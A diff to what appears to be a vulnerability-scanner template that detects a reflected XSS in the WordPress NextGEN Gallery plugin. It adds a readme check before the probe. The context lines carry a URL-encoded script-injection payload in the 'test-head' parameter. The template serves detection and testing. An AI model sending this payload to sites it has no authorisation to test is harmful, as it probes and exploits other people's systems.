@@ -12,11 +12,24 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
     cvss-score: 7.2
     cwe-id: CWE-79
-  tags: wp-plugin,edb,wordpress,xss
   metadata:
-    max-request: 1
+    max-request: 2
+  tags: wp-plugin,edb,wordpress,xss,vuln
+
+flow: http(1) && http(2)
 
 http:
+  - raw:
+      - |
+        GET /wp-content/plugins/nextgen-gallery/readme.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers:
+      - type: word
+        internal: true
+        words:
+          - '= NextGEN Gallery'
+
   - method: GET
     path:
       - '{{BaseURL}}/wp-content/plugins/nextgen-gallery/nggallery.php?test-head=%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E'
@@ -36,5 +49,4 @@ http:
       - type: status
         status:
           - 200
-
-# Enhanced by mp on 2022/09/23
+# digest: 4a0a0047304502205de24de1b1028faacfc0d1fec6e7a6324e6501455f29d0e53248b62360d0790e022100fac676bdb92e62aff51cb01ec7e091f86dc05accba4e13dd119de659e68ed715:922c64590222798bb761d5b6d8e72950
